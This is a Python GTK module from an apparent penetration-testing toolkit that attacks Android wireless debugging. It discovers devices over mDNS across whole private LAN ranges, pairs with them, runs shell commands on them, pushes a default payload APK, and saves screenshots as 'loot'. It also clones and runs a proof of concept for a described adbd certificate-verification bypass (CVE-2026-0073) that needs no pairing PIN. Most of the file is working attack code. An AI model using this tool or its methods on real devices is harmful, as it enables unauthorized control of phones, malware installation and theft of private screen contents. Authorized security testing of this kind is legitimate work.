"""Android Wireless Debugging RCE -- discover, pair, shell,
plus the CVE-2026-0073 auth-bypass PoC.

Two attack shapes on the same UI:

* **Legitimate pairing flow.** Discover the target's mDNS
  advertisement, ``adb pair`` with the 6-digit PIN from the
  target's screen, ``adb connect``, then everything ``adb``
  gives you: shell, install, exec-out screencap. Requires
  either physical access to read the PIN or a social attack
  that convinces the operator to type it.

* **CVE-2026-0073 authentication bypass.** No PIN required.
  Vulnerable ``adbd`` builds (Android 11-15 without the May
  2026 SPL) mis-handle the return value of ``EVP_PKEY_cmp``
  when the client cert uses a non-RSA algorithm: a negative
  return is treated as *match* rather than *error*, so an
  attacker-controlled ec/ed25519 cert passes the certificate
  verification without ever being in the trusted keys list.
  The PoC lives at ``/opt/poc-CVE-2026-0073``; this module
  is the front-end for it.

Discovery back-ends, in priority order:

  1. ``adb mdns services`` -- native to ADB and lists what
     Android is publishing right now with no extra daemon
     dependencies. Fastest and cleanest.
  2. ``avahi-browse`` -- runs against the whole mDNS
     namespace; catches services that ``adb mdns`` did not
     enumerate because they use a hostname the local ADB
     server can't resolve.
  3. ``nmap --script dns-service-discovery`` -- fallback for
     hosts without avahi.
"""
from __future__ import annotations

import re
import subprocess
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, services_banner, toast

# avahi-browse service types for ADB over Wi-Fi.
_SERVICE_SHELL = "_adb-tls-connect._tcp"
_SERVICE_PAIR = "_adb-tls-pairing._tcp"

# Where the CVE-2026-0073 PoC lives after the operator drops the
# adityatelange/poc-CVE-2026-0073 repo into /opt.
_POC_DIR = Path("/opt/poc-CVE-2026-0073")
_POC_MAIN = _POC_DIR / "poc-cve-2026-0073.py"
_POC_REPO = "https://github.com/adityatelange/poc-CVE-2026-0073"


@register
class AndroidRCE(NHModule):
    title = "Android Wireless ADB"
    icon = "phone-symbolic"
    description = ("Discover Android devices advertising ADB-over-"
                   "Wi-Fi, pair with a 6-digit PIN, drop into shell "
                   "or push a payload APK.")
    # We accept either avahi-browse (needs avahi-daemon) OR nmap
    # (which can do mDNS service discovery over broadcast without
    # any local daemon). The build() code picks whichever is
    # actually working at the moment.
    required_tools = ["adb"]

    def __init__(self, app_window):
        super().__init__(app_window)
        # host_ip -> {"host", "shell_port", "pair_port", "os_guess"}
        self._devices: dict[str, dict] = {}
        self._rows: list[Adw.ExpanderRow] = []
        self._proc: Process | None = None

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # Services banner up top: this module wants avahi-daemon
        # for the mDNS discovery back-end. The nmap fallback is
        # still there if the operator prefers not to run avahi.
        box.append(services_banner(
            self.app_window, ["avahi-daemon"]))

        # ---- discovery ------------------------------------
        disc = Adw.PreferencesGroup(
            title="Discovery",
            description="Multiple back-ends: `adb mdns services` "
                        "first, then avahi-browse for the full "
                        "namespace, then nmap as last resort.")

        # Native ADB mdns: instant one-shot, no daemon required,
        # tells the operator whether ADB itself thinks anything is
        # advertising.
        adb_mdns_row = Adw.ActionRow(
            title="adb mdns services",
            subtitle="Native, one-shot. Fastest way to see what's "
                     "advertising right now")
        adb_mdns_btn = Gtk.Button(label="Query",
                                  valign=Gtk.Align.CENTER)
        adb_mdns_btn.add_css_class("suggested-action")
        adb_mdns_btn.connect("clicked",
                             lambda _b: self._scan_adb_mdns())
        adb_mdns_row.add_suffix(adb_mdns_btn)
        disc.add(adb_mdns_row)

        disc_row = Adw.ActionRow(
            title="Continuous scan",
            subtitle="avahi-browse " + _SERVICE_SHELL
                     + " + " + _SERVICE_PAIR
                     + " (nmap fallback if avahi is unavailable)")
        self.scan_btn = Gtk.Button(label="Start",
                                   valign=Gtk.Align.CENTER)
        self.scan_btn.connect("clicked",
                              lambda _b: self._start_scan())
        disc_row.add_suffix(self.scan_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked",
                              lambda _b: self._stop_scan())
        disc_row.add_suffix(self.stop_btn)
        disc.add(disc_row)
        box.append(disc)

        # ---- discovered devices ---------------------------
        self.devs_group = Adw.PreferencesGroup(
            title="Devices",
            description="Rows expand to per-device actions "
                        "(pair / connect / install / screencap).")
        self._empty = Adw.ActionRow(
            title="No devices yet",
            subtitle="Start a scan and wait")
        self.devs_group.add(self._empty)
        box.append(self.devs_group)

        # ---- manual connect -----------------------------
        manual = Adw.PreferencesGroup(
            title="Manual",
            description="Point-blank targeting when mDNS is filtered.")
        self.host_entry = Adw.EntryRow(title="Host / IP")
        manual.add(self.host_entry)
        self.port_entry = Adw.EntryRow(title="Port (connect)")
        self.port_entry.set_text("5555")
        manual.add(self.port_entry)
        self.pair_port_entry = Adw.EntryRow(title="Port (pair)")
        manual.add(self.pair_port_entry)
        self.pin_entry = Adw.EntryRow(title="Pairing PIN (6 digits)")
        manual.add(self.pin_entry)

        for label, cb in (
            ("Pair", self._pair_manual),
            ("Connect", self._connect_manual),
            ("Disconnect all", self._disconnect_all),
        ):
            row = Adw.ActionRow(title=label)
            btn = Gtk.Button(label=label,
                             valign=Gtk.Align.CENTER)
            btn.connect("clicked", lambda _b, f=cb: f())
            row.add_suffix(btn)
            manual.add(row)
        box.append(manual)

        # ---- shell + payload ---------------------------
        act = Adw.PreferencesGroup(
            title="Actions on connected device")
        self.cmd_entry = Adw.EntryRow(
            title="Shell command (adb shell ...)")
        self.cmd_entry.set_text("id; getprop ro.build.version.release")
        act.add(self.cmd_entry)
        cmd_row = Adw.ActionRow(
            title="Run shell command",
            subtitle="adb -s <host:port> shell")
        cmd_btn = Gtk.Button(label="Run",
                             valign=Gtk.Align.CENTER)
        cmd_btn.connect("clicked", lambda _b: self._run_shell())
        cmd_row.add_suffix(cmd_btn)
        act.add(cmd_row)

        self.apk_entry = Adw.EntryRow(
            title="APK path to install")
        self.apk_entry.set_text(
            "/opt/wifipumpkin3-payloads/update.apk")
        act.add(self.apk_entry)
        apk_row = Adw.ActionRow(
            title="Install APK",
            subtitle="adb install -r <path>")
        apk_btn = Gtk.Button(label="Install",
                             valign=Gtk.Align.CENTER)
        apk_btn.connect("clicked", lambda _b: self._install_apk())
        apk_row.add_suffix(apk_btn)
        act.add(apk_row)

        sc_row = Adw.ActionRow(
            title="Screencap",
            subtitle="adb exec-out screencap -p > loot/*.png")
        sc_btn = Gtk.Button(label="Screencap",
                            valign=Gtk.Align.CENTER)
        sc_btn.connect("clicked", lambda _b: self._screencap())
        sc_row.add_suffix(sc_btn)
        act.add(sc_row)

        list_row = Adw.ActionRow(
            title="List devices",
            subtitle="adb devices -l")
        list_btn = Gtk.Button(label="List",
                              valign=Gtk.Align.CENTER)
        list_btn.connect("clicked", lambda _b: self._list_devices())
        list_row.add_suffix(list_btn)
        act.add(list_row)
        box.append(act)

        # ---- CVE-2026-0073 (adb TLS auth bypass) --------
        cve = Adw.PreferencesGroup(
            title="CVE-2026-0073 (auth bypass, no PIN needed)",
            description="Vulnerable adbd builds mishandle "
                        "EVP_PKEY_cmp negative returns and accept "
                        "attacker-controlled ec/ed25519 certs as "
                        "trusted. Runs the PoC from "
                        + str(_POC_DIR) + ".")

        # Install / status row
        self.cve_status = Adw.ActionRow(
            title="PoC status",
            subtitle=(str(_POC_DIR) + " -- installed"
                      if _POC_MAIN.exists()
                      else str(_POC_DIR) + " -- not installed"))
        install_btn = Gtk.Button(label="Install / update",
                                 valign=Gtk.Align.CENTER)
        install_btn.connect(
            "clicked", lambda _b: self._install_poc())
        self.cve_status.add_suffix(install_btn)
        cve.add(self.cve_status)

        # Key type selector (ec vs ed25519). Both trigger the
        # bypass; ed25519 returns -2 (unsupported), ec returns -1
        # (type mismatch). Vulnerable adbd treats both as match.
        self.cve_key = Adw.ComboRow(title="Client key type")
        self.cve_key.set_model(Gtk.StringList.new([
            "ec        (EVP_PKEY_cmp returns -1, type mismatch)",
            "ed25519   (EVP_PKEY_cmp returns -2, unsupported op)",
        ]))
        cve.add(self.cve_key)

        # Command to run on the target -- same UX as the manual
        # section so the operator can reuse the shell cmd entry.
        self.cve_command = Adw.EntryRow(title="Shell command")
        self.cve_command.set_text("id; getprop ro.build.version.release")
        cve.add(self.cve_command)

        self.cve_verbose = Adw.SwitchRow(
            title="Verbose protocol trace",
            subtitle="--verbose; prints CNXN/STLS packet dump")
        cve.add(self.cve_verbose)

        cve_run_row = Adw.ActionRow(
            title="Run the auth-bypass PoC",
            subtitle="Requires the target's IP + connect port set "
                     "in the manual section above")
        cve_btn = Gtk.Button(label="Run",
                             valign=Gtk.Align.CENTER)
        cve_btn.add_css_class("destructive-action")
        cve_btn.connect("clicked",
                        lambda _b: self._run_cve())
        cve_run_row.add_suffix(cve_btn)
        cve.add(cve_run_row)
        box.append(cve)

        # ---- log
        self.output = OutputView()
        box.append(self.output)
        return box

    # ------------------------------------------------- discovery
    def _start_scan(self) -> None:
        """avahi-browse needs ``avahi-daemon`` running; if it's not,
        we start it (root, via the helper) and retry once. If avahi
        is completely unavailable, fall back to nmap's broadcast
        mDNS service discovery script -- no daemon needed."""
        if self._proc is not None and self._proc.running:
            return
        self._devices = {}
        self._render()
        self.output.append("# scanning for ADB-over-Wi-Fi\n")

        # Preflight: check whether avahi-daemon is running. The
        # operator is expected to start it from Kali Services (the
        # banner at the top of this module deep-links there); we do
        # not start it here on their behalf. Fall through to the
        # nmap back-end if avahi-browse is missing OR the daemon
        # is not running.
        script = (
            "if command -v avahi-browse >/dev/null 2>&1 && "
            "   pgrep -x avahi-daemon >/dev/null; then "
            "  echo AVAHI; "
            "else "
            "  echo NMAP; "
            "fi"
        )

        def on_probe(r: Result) -> None:
            mode = (r.stdout or "").strip().splitlines()[-1:] \
                if r.stdout else ["NMAP"]
            mode = mode[0] if mode else "NMAP"
            if mode == "AVAHI":
                self._scan_avahi()
            else:
                self._scan_nmap()

        run_async(["sh", "-c", script], on_probe,
                  root=False, timeout=5)
        self.scan_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)

    def _scan_adb_mdns(self) -> None:
        """Fire ``adb mdns services`` -- a one-shot enumeration
        that hits Android's own mDNS resolver via the local ADB
        server. Output looks like:

            List of discovered mdns services
            adb-abcdef12   _adb-tls-connect._tcp   192.168.1.42:38715
            adb-abcdef12   _adb-tls-pairing._tcp   192.168.1.42:37101

        Merges into the same devices dict the streaming avahi/nmap
        scans fill, so the row list is one unified view."""
        self.output.append("# adb mdns services\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            for line in (r.stdout or "").splitlines():
                # skip header + blank
                if not line or line.startswith("List of"):
                    continue
                parts = line.split()
                if len(parts) < 3:
                    continue
                # parts[0] = adb-<hostname>
                # parts[1] = service type
                # parts[2] = ip:port
                svc = parts[1]
                if ":" not in parts[2]:
                    continue
                ip, port_s = parts[2].rsplit(":", 1)
                try:
                    port = int(port_s)
                except ValueError:
                    continue
                d = self._devices.setdefault(ip, {
                    "host": parts[0],
                    "ip": ip,
                    "shell_port": None,
                    "pair_port": None,
                })
                if svc.startswith("_adb-tls-connect"):
                    d["shell_port"] = port
                elif svc.startswith("_adb-tls-pairing"):
                    d["pair_port"] = port
            self._render()

        run_async(["adb", "mdns", "services"], done,
                  root=False, timeout=10)

    def _scan_avahi(self) -> None:
        """Foreground avahi-browse streaming scan. Two services
        (shell + pair) in parallel, resolved output. Runs until the
        operator hits Stop."""
        script = (
            "avahi-browse -r -p " + _SERVICE_SHELL + " & "
            "PID1=$!; "
            "avahi-browse -r -p " + _SERVICE_PAIR + " & "
            "PID2=$!; "
            "trap 'kill $PID1 $PID2 2>/dev/null' EXIT; "
            "wait"
        )
        self.output.append("# using avahi-browse\n")

        def on_line(text: str) -> None:
            self.output.append(text)
            for line in text.splitlines():
                self._ingest_avahi(line)
            self._render()

        def on_done(code: int) -> None:
            self.output.append(
                "[avahi-browse exited: %d]\n" % code)
            self._proc = None
            self.scan_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)

        self._proc = Process(
            ["sh", "-c", script], on_line, on_done,
            root=False)
        self._proc.start()

    def _scan_nmap(self) -> None:
        """Fallback: nmap's ``dns-service-discovery`` NSE script
        does a one-shot broadcast mDNS scan against the network and
        prints service instances with hostnames, IPs and ports.
        Runs against the phone's current LAN (192.168.0.0/16 +
        10.0.0.0/8 default) unless the operator has set a specific
        target in the manual section."""
        self.output.append(
            "# avahi-daemon unavailable; falling back to nmap\n")

        script = (
            "nmap --script dns-service-discovery "
            "  -p 5353 -sU -T4 --host-timeout 30s "
            "  --script-args='dns-service-discovery.services="
            + _SERVICE_SHELL + "," + _SERVICE_PAIR + "' "
            "  192.168.0.0/16 10.0.0.0/8 172.16.0.0/12 "
            "  2>&1"
        )

        def on_line(text: str) -> None:
            self.output.append(text)
            for line in text.splitlines():
                self._ingest_nmap(line)
            self._render()

        def on_done(code: int) -> None:
            self.output.append(
                "[nmap exited: %d]\n" % code)
            self._proc = None
            self.scan_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)

        # Root because nmap needs raw sockets for -sU.
        self._proc = Process(
            ["sh", "-c", script], on_line, on_done, root=True)
        self._proc.start()

    def _ingest_nmap(self, line: str) -> None:
        """nmap ``dns-service-discovery`` output looks like:
             |_  _adb-tls-connect._tcp Address=192.168.1.42
             |     Port=38715 Target=android-abcd.local
        We keep a small state machine here: when we see a service
        header we remember which one is active, then when we see
        the Address/Port/Target lines we plug them into the
        matching device row."""
        # Service header.
        m_svc = re.search(
            r"(_adb-tls-(?:connect|pairing))\._tcp", line)
        if m_svc:
            self._nmap_svc = "_" + m_svc.group(1) + "._tcp"
            return
        # Address + Port on the same or subsequent line.
        m_ip = re.search(r"Address=([\d.]+)", line)
        m_port = re.search(r"Port=(\d+)", line)
        m_target = re.search(r"Target=([^\s]+)", line)
        svc = getattr(self, "_nmap_svc", None)
        if not svc:
            return
        # Multiple pieces may show up on the same line; try each.
        if m_ip:
            ip = m_ip.group(1)
            d = self._devices.setdefault(ip, {
                "host": "", "ip": ip,
                "shell_port": None, "pair_port": None,
            })
            if m_target:
                d["host"] = m_target.group(1)
            if m_port:
                port = int(m_port.group(1))
                if svc == _SERVICE_SHELL:
                    d["shell_port"] = port
                elif svc == _SERVICE_PAIR:
                    d["pair_port"] = port

    def _stop_scan(self) -> None:
        if self._proc is not None:
            self._proc.stop()

    def _ingest_avahi(self, line: str) -> None:
        """avahi-browse -p emits ';'-separated resolve lines like:
             =;wlan0;IPv4;adb-XXXX;_adb-tls-connect._tcp;local;
             android-abcd.local;192.168.1.42;38715;
        We care about the type (col 4), the IP (col 7), the port
        (col 8), and the hostname (col 6)."""
        if not line.startswith("="):
            return
        parts = line.split(";")
        if len(parts) < 9:
            return
        svc_type = parts[4]
        host = parts[6]
        ip = parts[7]
        try:
            port = int(parts[8])
        except ValueError:
            return
        key = ip
        d = self._devices.setdefault(key, {
            "host": host, "ip": ip,
            "shell_port": None, "pair_port": None,
        })
        if svc_type == _SERVICE_SHELL:
            d["shell_port"] = port
        elif svc_type == _SERVICE_PAIR:
            d["pair_port"] = port

    def _render(self) -> None:
        for r in self._rows:
            self.devs_group.remove(r)
        self._rows = []
        self._empty.set_visible(not self._devices)
        for ip, d in sorted(self._devices.items()):
            row = Adw.ExpanderRow(
                title=d.get("host") or ip,
                subtitle=ip + " · connect=" + str(
                    d.get("shell_port") or "?")
                + " · pair=" + str(d.get("pair_port") or "?"))
            # Buttons: Pair, Connect, Copy to manual.
            for label, cb in (
                ("Pair", lambda dev=d: self._pair_dev(dev)),
                ("Connect", lambda dev=d: self._connect_dev(dev)),
                ("Populate manual",
                 lambda dev=d: self._populate_manual(dev)),
            ):
                r = Adw.ActionRow(title=label)
                btn = Gtk.Button(label=label,
                                 valign=Gtk.Align.CENTER)
                btn.connect("clicked", lambda _b, f=cb: f())
                r.add_suffix(btn)
                row.add_row(r)
            self.devs_group.add(row)
            self._rows.append(row)

    # ------------------------------------------------- pair / connect
    def _populate_manual(self, dev: dict) -> None:
        self.host_entry.set_text(dev.get("ip", ""))
        if dev.get("shell_port"):
            self.port_entry.set_text(str(dev["shell_port"]))
        if dev.get("pair_port"):
            self.pair_port_entry.set_text(str(dev["pair_port"]))
        toast(self.app_window, "Manual fields populated")

    def _pair_dev(self, dev: dict) -> None:
        pin = self.pin_entry.get_text().strip()
        if not pin:
            toast(self.app_window,
                  "Type the 6-digit PIN in the manual section "
                  "first")
            return
        port = dev.get("pair_port") or 0
        if not port:
            toast(self.app_window,
                  "Pair port unknown yet; keep scanning or "
                  "populate manually")
            return
        self._do_pair(dev["ip"], port, pin)

    def _connect_dev(self, dev: dict) -> None:
        port = dev.get("shell_port") or 5555
        self._do_connect(dev["ip"], port)

    def _pair_manual(self) -> None:
        host = self.host_entry.get_text().strip()
        port_s = self.pair_port_entry.get_text().strip()
        pin = self.pin_entry.get_text().strip()
        if not host or not port_s or not pin:
            toast(self.app_window,
                  "Set host, pair port, and PIN")
            return
        try:
            port = int(port_s)
        except ValueError:
            toast(self.app_window, "Pair port must be an integer")
            return
        self._do_pair(host, port, pin)

    def _connect_manual(self) -> None:
        host = self.host_entry.get_text().strip()
        port_s = self.port_entry.get_text().strip()
        if not host:
            toast(self.app_window, "Set host")
            return
        try:
            port = int(port_s or "5555")
        except ValueError:
            toast(self.app_window, "Connect port must be an integer")
            return
        self._do_connect(host, port)

    def _do_pair(self, host: str, port: int, pin: str) -> None:
        # `adb pair` reads the PIN from stdin.
        argv = ["sh", "-c",
                "echo %s | adb pair %s:%d"
                % (pin, host, port)]
        self.output.append(
            "$ echo <pin> | adb pair %s:%d\n" % (host, port))

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            if "Successfully paired" in (r.stdout or ""):
                stamp = time.strftime("%Y%m%d-%H%M%S")
                get_loot_store().record(
                    module="android_rce", type="adb_pair",
                    target="%s:%d" % (host, port),
                    path="",
                    notes="paired PIN=<redacted> at " + stamp)

        run_async(argv, done, root=False, timeout=30)

    def _do_connect(self, host: str, port: int) -> None:
        argv = ["adb", "connect", "%s:%d" % (host, port)]
        self.output.append("$ " + " ".join(argv) + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)

        run_async(argv, done, root=False, timeout=20)

    def _disconnect_all(self) -> None:
        run_async(["adb", "disconnect"],
                  lambda r: self.output.append(r.stdout or ""),
                  root=False, timeout=10)

    # -------------------------------------------- shell / apk / cap
    def _target_serial(self) -> str:
        host = self.host_entry.get_text().strip()
        port = self.port_entry.get_text().strip() or "5555"
        return host + ":" + port if host else ""

    def _run_shell(self) -> None:
        serial = self._target_serial()
        if not serial:
            toast(self.app_window,
                  "Set host + port to target a specific device")
            return
        cmd = self.cmd_entry.get_text().strip()
        if not cmd:
            return
        argv = ["adb", "-s", serial, "shell", cmd]
        self.output.append("$ " + " ".join(argv) + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)

        run_async(argv, done, root=False, timeout=60)

    def _install_apk(self) -> None:
        serial = self._target_serial()
        if not serial:
            toast(self.app_window, "Set host + port first")
            return
        apk = self.apk_entry.get_text().strip()
        if not apk:
            return
        argv = ["adb", "-s", serial, "install", "-r", apk]
        self.output.append("$ " + " ".join(argv) + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            if "Success" in (r.stdout or ""):
                get_loot_store().record(
                    module="android_rce", type="apk_install",
                    target=serial,
                    path=apk,
                    notes="installed via wireless ADB")

        run_async(argv, done, root=False, timeout=120)

    def _screencap(self) -> None:
        serial = self._target_serial()
        if not serial:
            toast(self.app_window, "Set host + port first")
            return
        stamp = time.strftime("%Y%m%d-%H%M%S")
        out = loot_path("android_rce",
                        "screen-%s-%s.png"
                        % (serial.replace(":", "_"), stamp))
        script = ("adb -s %s exec-out screencap -p > %s"
                  % (serial, out))
        self.output.append("$ " + script + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            get_loot_store().record(
                module="android_rce", type="screencap_png",
                target=serial, path=out,
                notes="wireless ADB screencap")
            toast(self.app_window,
                  "Saved to " + out)

        run_async(["sh", "-c", script], done,
                  root=False, timeout=30)

    def _list_devices(self) -> None:
        run_async(["adb", "devices", "-l"],
                  lambda r: self.output.append(
                      r.stdout or ""),
                  root=False, timeout=10)

    # -------------------------------------------------- CVE-2026-0073
    def _install_poc(self) -> None:
        """Idempotent install of adityatelange/poc-CVE-2026-0073
        under /opt. Requires root because /opt isn't user-writable,
        chown to kali afterwards so we can source Python venvs
        from the login context."""
        self.output.append("# installing CVE-2026-0073 PoC…\n")
        script = (
            "set -e; "
            "mkdir -p /opt; "
            "if [ ! -d %s/.git ]; then "
            "  git clone --depth 1 %s %s; "
            "else "
            "  git -C %s pull --ff-only || true; "
            "fi; "
            "chown -R kali:kali %s || true; "
            "python3 -c 'import cryptography' 2>/dev/null || "
            "  pip install --break-system-packages cryptography "
            "    2>&1 | tail -3; "
            "echo ---installed---"
        ) % (_POC_DIR, _POC_REPO, _POC_DIR,
             _POC_DIR, _POC_DIR)

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            self.cve_status.set_subtitle(
                str(_POC_DIR) +
                (" -- installed" if _POC_MAIN.exists()
                 else " -- install failed"))
            toast(self.app_window,
                  "CVE-2026-0073 PoC install finished")

        run_async(["sh", "-c", script], done,
                  root=True, timeout=300)

    def _run_cve(self) -> None:
        """Fire the PoC against ``host:port`` from the manual
        section, executing the command in the CVE-specific entry
        with the picked key type. Logs everything to loot."""
        if not _POC_MAIN.exists():
            toast(self.app_window,
                  "Install the CVE-2026-0073 PoC first")
            return
        host = self.host_entry.get_text().strip()
        port_s = self.port_entry.get_text().strip() or "5555"
        if not host:
            toast(self.app_window,
                  "Set the target IP in the manual section first")
            return
        try:
            port = int(port_s)
        except ValueError:
            toast(self.app_window, "Port must be an integer")
            return

        cmd = self.cve_command.get_text().strip() or "id"
        key_type = ("ec" if self.cve_key.get_selected() == 0
                    else "ed25519")
        verbose = ["--verbose"] if self.cve_verbose.get_active() \
            else []

        argv = ["python3", str(_POC_MAIN),
                host, str(port), cmd, key_type] + verbose
        self.output.append("$ " + " ".join(argv) + "\n")

        stamp = time.strftime("%Y%m%d-%H%M%S")
        log_path = loot_path(
            "android_rce",
            "cve-2026-0073-%s-%s.log" % (
                host.replace(".", "_"), stamp))
        loot_id = get_loot_store().record(
            module="android_rce", type="adb_cve_2026_0073",
            target="%s:%d" % (host, port),
            path=log_path,
            notes="key=" + key_type + " cmd=" + cmd)

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            try:
                with open(log_path, "w") as fp:
                    fp.write("+ " + " ".join(argv) + "\n\n")
                    fp.write(r.stdout or "")
                    fp.write("\n--- stderr ---\n")
                    fp.write(r.stderr or "")
            except OSError:
                pass
            get_loot_store().refresh_size(loot_id)
            if "Exploitation successful" in (r.stdout or ""):
                get_loot_store().append_notes(
                    loot_id, "SUCCESS")
                toast(self.app_window,
                      "CVE-2026-0073 succeeded")
            else:
                get_loot_store().append_notes(
                    loot_id, "no success marker")

        # PoC talks raw TCP -- no root required.
        run_async(argv, done, root=False, timeout=60)

    def set_target(self, target: str) -> None:
        """Bare IP or ``ip:port`` populates the manual section."""
        if not target:
            return
        if ":" in target:
            host, _, port = target.partition(":")
            self.host_entry.set_text(host.strip())
            self.port_entry.set_text(port.strip())
        else:
            self.host_entry.set_text(target.strip())
